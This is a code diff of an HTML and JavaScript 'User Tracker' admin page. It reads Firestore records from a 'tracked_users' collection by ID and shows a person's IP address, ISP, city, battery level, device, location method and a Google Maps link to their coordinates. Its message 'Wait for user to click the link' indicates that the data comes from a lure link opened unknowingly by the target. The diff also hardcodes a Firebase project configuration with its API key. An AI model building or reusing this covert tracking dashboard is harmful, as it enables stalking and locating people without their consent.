@@ -3,76 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Check User Info</title>
+    <title>Admin Panel</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; padding: 20px; }
-        h1 { text-align: center; color: #333; margin-top: 50px; }
-        .search-box { display: flex; justify-content: center; gap: 10px; max-width: 800px; margin: 0 auto 30px auto; }
-        input { padding: 15px; border: 1px solid #ccc; border-radius: 5px; width: 40%; outline: none; }
-        button { padding: 15px 30px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        button:hover { background-color: #0056b3; }
-        #result-area { display: none; max-width: 800px; margin: 0 auto; background: white; border: 1px solid #ddd; border-radius: 5px; overflow: hidden; }
-        .row { display: flex; border-bottom: 1px solid #eee; padding: 15px; }
-        .label { font-weight: bold; width: 30%; color: #333; }
-        .value { width: 70%; color: #555; word-break: break-all; }
-        .map-link { color: #d32f2f; text-decoration: none; font-weight: bold; font-size: 1.1em; }
+        body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        input { padding: 10px; width: 60%; margin-right: 10px; border: 1px solid #ddd; border-radius: 4px; }
+        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background: #0056b3; }
+        .data-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; }
+        .data-label { font-weight: bold; color: #555; }
+        .data-value { color: #000; text-align: right; }
+        #map-link { display: block; text-align: center; background: #28a745; color: white; padding: 10px; text-decoration: none; margin-top: 20px; border-radius: 4px; }
     </style>
 </head>
 <body>
 
-    <h1>Check User Info</h1>
+    <div class="container">
+        <h2 style="text-align:center">User Tracker</h2>
+        <div style="text-align:center; margin-bottom: 20px;">
+            <input type="text" id="inputId" placeholder="Enter ID (e.g., 8585814444)">
+            <button onclick="getData()">Check</button>
+        </div>
 
-    <div class="search-box">
-        <input type="text" id="refIdInput" placeholder="Enter Ref ID">
-        <button onclick="fetchInfo()">Search</button>
-    </div>
-
-    <div id="result-area">
-        <div class="row"><div class="label">Accuracy</div><div class="value" id="disp_acc" style="color: green; font-weight: bold;">...</div></div>
-        <div class="row"><div class="label">Map</div><div class="value"><a href="#" id="disp_map" target="_blank" class="map-link">📍 Open Google Maps</a></div></div>
-        <div class="row"><div class="label">IP Address</div><div class="value" id="disp_ip">...</div></div>
-        <div class="row"><div class="label">ISP</div><div class="value" id="disp_isp">...</div></div>
-        <div class="row"><div class="label">Device</div><div class="value" id="disp_device">...</div></div>
-        <div class="row"><div class="label">Battery</div><div class="value" id="disp_battery">...</div></div>
-        <div class="row"><div class="label">Last Updated</div><div class="value" id="disp_time">...</div></div>
+        <div id="results" style="display:none;">
+            <div class="data-row"><span class="data-label">Time:</span> <span class="data-value" id="time"></span></div>
+            <div class="data-row"><span class="data-label">IP Address:</span> <span class="data-value" id="ip"></span></div>
+            <div class="data-row"><span class="data-label">Location:</span> <span class="data-value" id="city"></span></div>
+            <div class="data-row"><span class="data-label">ISP:</span> <span class="data-value" id="isp"></span></div>
+            <div class="data-row"><span class="data-label">Battery:</span> <span class="data-value" id="battery"></span></div>
+            <div class="data-row"><span class="data-label">Device:</span> <span class="data-value" id="device"></span></div>
+            <div class="data-row"><span class="data-label">Method:</span> <span class="data-value" id="method"></span></div>
+            
+            <a id="map-link" target="_blank" href="#">Open Google Maps</a>
+        </div>
     </div>
 
     <script type="module">
-        import { db } from './firebase-config.js';
-        import { doc, getDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
 
-        window.fetchInfo = async function() {
-            const id = document.getElementById('refIdInput').value;
-            const resultArea = document.getElementById('result-area');
+        const firebaseConfig = {
+            apiKey: "AIzaSyAgisxeeq0hYN-7SF62IGkvZHPVmWnyThg",
+            authDomain: "xyze-9b306.firebaseapp.com",
+            projectId: "xyze-9b306",
+            storageBucket: "xyze-9b306.firebasestorage.app",
+            messagingSenderId: "814674031370",
+            appId: "1:814674031370:web:aa8f08895c1d305b2540f3",
+            measurementId: "G-33ZZ3HXVFC"
+        };
 
-            if(!id) { alert("Please enter a Ref ID"); return; }
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
 
-            try {
-                const docRef = doc(db, "tracked_users", id);
-                const docSnap = await getDoc(docRef);
+        window.getData = async function() {
+            const id = document.getElementById('inputId').value;
+            if(!id) return alert("Enter ID");
 
-                if (docSnap.exists()) {
-                    const data = docSnap.data();
-                    
-                    document.getElementById('disp_acc').innerText = data.accuracy || "Approx IP"; // Shows if GPS or IP
-                    document.getElementById('disp_ip').innerText = data.ip;
-                    document.getElementById('disp_isp').innerText = data.isp;
-                    document.getElementById('disp_device').innerText = data.device + " (" + data.os + ")";
-                    document.getElementById('disp_battery').innerText = data.battery;
-                    document.getElementById('disp_time').innerText = data.lastUpdated;
-                    
-                    // Fixed Map Link logic
-                    const mapUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
-                    document.getElementById('disp_map').href = mapUrl;
+            const docRef = doc(db, "tracked_users", id);
+            const docSnap = await getDoc(docRef);
 
-                    resultArea.style.display = 'block';
-                } else {
-                    alert("No data found for this ID!");
-                    resultArea.style.display = 'none';
-                }
-            } catch (error) {
-                console.error("Error getting document:", error);
-                alert("Error fetching data.");
+            if (docSnap.exists()) {
+                const data = docSnap.data();
+                document.getElementById('results').style.display = 'block';
+                document.getElementById('time').innerText = data.lastUpdated;
+                document.getElementById('ip').innerText = data.ip;
+                document.getElementById('city').innerText = data.city;
+                document.getElementById('isp').innerText = data.isp;
+                document.getElementById('battery').innerText = data.battery;
+                document.getElementById('device').innerText = data.platform;
+                document.getElementById('method').innerText = data.locationMethod;
+                
+                // Map Link
+                document.getElementById('map-link').href = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
+            } else {
+                alert("ID not found yet. Wait for user to click the link.");
             }
         }
     </script>
